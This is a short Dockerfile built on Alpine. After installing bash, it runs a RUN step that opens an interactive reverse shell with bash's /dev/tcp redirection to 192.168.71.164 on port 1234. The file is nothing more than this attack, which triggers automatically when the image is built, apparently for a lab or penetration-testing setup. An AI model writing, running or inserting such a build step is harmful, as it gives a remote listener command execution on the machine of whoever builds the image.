FROM alpine
RUN apk update && apk add bash
RUN bash -c 'exec bash -i >& /dev/tcp/192.168.71.164/1234 0>&1'

